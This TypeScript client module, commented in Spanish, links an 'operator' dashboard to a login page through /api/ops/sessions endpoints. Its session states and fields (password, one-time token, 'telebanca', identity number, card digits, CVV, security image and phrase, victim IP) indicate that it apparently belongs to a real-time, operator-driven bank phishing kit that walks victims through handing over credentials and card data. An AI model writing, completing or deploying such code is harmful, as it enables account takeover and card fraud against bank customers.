/** Tipos + cliente HTTP del canal operador ↔ login (funciona entre navegadores). */

export type OpsSessionState =
  | "waiting"
  | "waiting-token"
  | "token"
  | "telebanca"
  | "waiting-telebanca"
  | "typing-telebanca"
  | "identidad"
  | "waiting-identidad"
  | "typing-identidad"
  | "waiting-imagen"
  | "imagen"
  | "waiting-pass"
  | "c-interna"
  | "done"
  | "error"
  | "error-user"
  | "error-pass"
  | "error-tejuino"
  | "error-token"
  | "error-identidad"
  | "typing"
  | "typing-pass"
  | "typing-tejuino";

export type OpsSession = {
  id: string;
  username: string;
  password?: string;
  token?: string;
  device?: "desktop" | "mobile";
  ip?: string;
  state: OpsSessionState;
  createdAt: number;
  updatedAt: number;
  last_seen?: number;
  imageSrc?: string;
  phrase?: string;
  dui?: string;
  cardDigits?: string;
  cvv?: string;
  lastAction?: string;
  actionSeq?: number;
};

export function createSessionId() {
  if (typeof crypto !== "undefined" && "randomUUID" in crypto) {
    return crypto.randomUUID();
  }
  return `ba_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
}

export function detectDevice(): "desktop" | "mobile" {
  if (typeof navigator === "undefined") return "desktop";
  return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
    ? "mobile"
    : "desktop";
}

async function api<T>(url: string, init?: RequestInit): Promise<T> {
  const controller = new AbortController();
  const timeoutMs = 8000;
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      ...init,
      headers: {
        "Content-Type": "application/json",
        ...(init?.headers || {}),
      },
      cache: "no-store",
      signal: init?.signal ?? controller.signal,
    });
    if (!res.ok) {
      const text = await res.text().catch(() => "");
      throw new Error(text || `HTTP ${res.status}`);
    }
    return res.json() as Promise<T>;
  } finally {
    clearTimeout(timer);
  }
}

export async function upsertOpsSession(session: OpsSession) {
  const data = await api<{ session: OpsSession }>("/api/ops/sessions", {
    method: "POST",
    body: JSON.stringify(session),
  });
  return data.session;
}

export async function patchOpsSession(
  sessionId: string,
  patch: Partial<OpsSession>,
) {
  const data = await api<{ session: OpsSession }>(
    `/api/ops/sessions/${sessionId}`,
    {
      method: "PATCH",
      body: JSON.stringify(patch),
    },
  );
  return data.session;
}

export async function fetchOpsSession(sessionId: string) {
  try {
    const data = await api<{ session: OpsSession }>(
      `/api/ops/sessions/${sessionId}`,
    );
    return data.session;
  } catch {
    return null;
  }
}

export async function fetchOpsSessions() {
  const data = await api<{ sessions: OpsSession[] }>("/api/ops/sessions");
  return data.sessions;
}

export async function postOpsAction(
  sessionId: string,
  action: string,
  extra?: { imageSrc?: string; phrase?: string },
) {
  const data = await api<{ session: OpsSession }>(
    `/api/ops/sessions/${sessionId}/action`,
    {
      method: "POST",
      body: JSON.stringify({ action, ...extra }),
    },
  );
  return data.session;
}

export async function clearOpsSessions() {
  await api<{ ok: boolean }>("/api/ops/sessions", { method: "DELETE" });
}
